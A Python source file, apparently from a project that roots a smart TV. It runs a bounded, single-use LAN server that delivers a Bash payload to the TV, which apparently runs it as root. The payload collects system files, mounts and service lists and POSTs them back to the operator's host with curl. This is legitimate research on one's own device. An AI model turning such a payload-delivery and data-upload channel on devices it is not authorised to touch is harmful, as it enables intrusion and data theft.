"""Bounded, one-session Q80T inventory transport. No arbitrary command input."""
from __future__ import annotations

import argparse
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer
import ipaddress
import json
from pathlib import Path
import re
import time
from typing import cast

ROOT = Path(__file__).resolve().parents[2]
LIMIT = 512 * 1024


def command_text(mode: str, host: str, token: str) -> bytes:
    if mode != 'Snapshot':
        raise ValueError('Only read-only Snapshot is enabled')
    ipaddress.IPv4Address(host)
    if not re.fullmatch(r'[0-9a-f]{24,48}', token):
        raise ValueError('Invalid session token')
    survey = (ROOT / 'scripts/tiz0wn/snapshot.sh').read_text(encoding='utf-8')
    # Sourced in the already proven privileged Bash context; no executable label change.
    return f'''rm -f /tmp/dtv{token[:6]}
OUT=/tmp/.danstv-baseline-$$
(
  printf 'DANSTV-ROOT-CHANNEL mode=Snapshot\\n'
  printf 'DANSTV-EUID=%s\\n' "$(/usr/bin/id -u)"
  /usr/bin/id
  if [ "$(/usr/bin/id -u)" != 0 ]; then
    printf 'DANSTV-EXIT=126\\nDANSTV-END-OF-REPORT\\n'
    exit 126
  fi
  (
    printf '\\n=== Platform / boot / partitions ===\\n'
    cat /etc/info.ini /proc/sys/kernel/random/boot_id /proc/partitions 2>/dev/null || :
    mount 2>/dev/null || :
    ls -l /etc/profile.d /opt/dbspace/.app-context.db 2>/dev/null || :
    /usr/bin/vconftool get db/first_screen/type 2>/dev/null || :
    systemctl list-units --type=service --all --no-pager 2>/dev/null || :
{survey}
  )
  STATUS=$?
  printf '\\nDANSTV-EXIT=%s\\nDANSTV-END-OF-REPORT\\n' "$STATUS"
) > "$OUT" 2>&1
/usr/bin/curl -fsS --connect-timeout 5 --max-time 25 -X POST --data-binary @"$OUT" http://{host}:8181/r/{token} >/dev/null 2>&1
rm -f "$OUT"
'''.encode('utf-8')


def valid_report(body: bytes) -> bool:
    lines = body.splitlines()
    return (len(lines) >= 4
            and lines[0] == b'DANSTV-ROOT-CHANNEL mode=Snapshot'
            and lines[1] == b'DANSTV-EUID=0'
            and lines[-2:] == [b'DANSTV-EXIT=0', b'DANSTV-END-OF-REPORT'])


class SnapshotServer(HTTPServer):
    """Single-threaded bounded receiver; one script fetch and one result."""
    def __init__(self, address, tv: str, token: str, output: Path):
        self.tv, self.token, self.output = tv, token, output
        self.payload = command_text('Snapshot', address[0], token)
        self.served = False
        self.received = False
        super().__init__(address, Receiver)
        self.timeout = 0.5

    def get_request(self):
        connection, address = super().get_request()
        connection.settimeout(3)
        return connection, address


class Receiver(BaseHTTPRequestHandler):
    @property
    def session(self) -> SnapshotServer:
        return cast(SnapshotServer, self.server)

    def log_message(self, format: str, *args):
        pass  # Never log session URLs or private report contents.

    def reply(self, status: int, body: bytes = b''):
        self.send_response(status)
        self.send_header('Content-Length', str(len(body)))
        self.send_header('Cache-Control', 'no-store')
        self.end_headers()
        if body:
            self.wfile.write(body)

    def authorized(self, kind: str) -> bool:
        return (self.client_address[0] == self.session.tv
                and self.path == f'/{kind}/{self.session.token}')

    def do_GET(self):
        if not self.authorized('d'):
            self.reply(404)
        elif self.session.served:
            self.reply(409)
        else:
            self.session.served = True
            self.reply(200, self.session.payload)

    def do_POST(self):
        if not self.authorized('r'):
            self.reply(404)
            return
        if not self.session.served or self.session.received:
            self.reply(409)
            return
        try:
            length = int(self.headers.get('Content-Length', '-1'))
        except ValueError:
            self.reply(400)
            return
        if self.headers.get('Transfer-Encoding') or not 0 < length <= LIMIT:
            self.reply(413)
            return
        try:
            body = self.rfile.read(length)
        except (TimeoutError, OSError):
            self.reply(408)
            return
        if len(body) != length or not valid_report(body):
            self.reply(422)
            return
        try:
            with self.session.output.open('xb') as report:
                report.write(body)
        except FileExistsError:
            self.reply(409)
            return
        self.session.received = True
        self.reply(204)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', required=True)
    parser.add_argument('--tv', required=True)
    parser.add_argument('--token', required=True)
    parser.add_argument('--output', required=True)
    parser.add_argument('--mode', choices=['Snapshot'], default='Snapshot')
    parser.add_argument('--timeout', type=int, default=300)
    args = parser.parse_args()
    host, tv = str(ipaddress.IPv4Address(args.host)), str(ipaddress.IPv4Address(args.tv))
    if not all(ipaddress.IPv4Address(value).is_private and not ipaddress.IPv4Address(value).is_loopback
               for value in (host, tv)):
        parser.error('Only private LAN addresses allowed')
    if not re.fullmatch(r'[0-9a-f]{24,48}', args.token) or not 1 <= args.timeout <= 600:
        parser.error('Invalid session token or timeout')
    output = Path(args.output).resolve()
    if (ROOT / '.local/tiz0wn-lab').resolve() not in output.parents or output.exists():
        parser.error('Output must be a new private lab file')
    output.parent.mkdir(parents=True, exist_ok=True)
    with SnapshotServer((host, 8181), tv, args.token, output) as server:
        print('Snapshot receiver ready; reconnect Remote PC and open Shared Folder once.', flush=True)
        deadline = time.monotonic() + args.timeout
        try:
            while not server.received and time.monotonic() < deadline:
                server.handle_request()
        except KeyboardInterrupt:
            return 130
        if not server.received:
            print('NO-REPORT: no validated root result; session has stopped.', flush=True)
            return 1
    metadata = {'received_utc': datetime.now(timezone.utc).isoformat(), 'mode': 'Snapshot',
                'euid': 0, 'exit_status': 0, 'hardware_validation': 'pending owner review'}
    output.with_suffix('.json').write_text(json.dumps(metadata, indent=2), encoding='utf-8')
    print(f'SNAPSHOT-RECEIVED: {output}', flush=True)
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
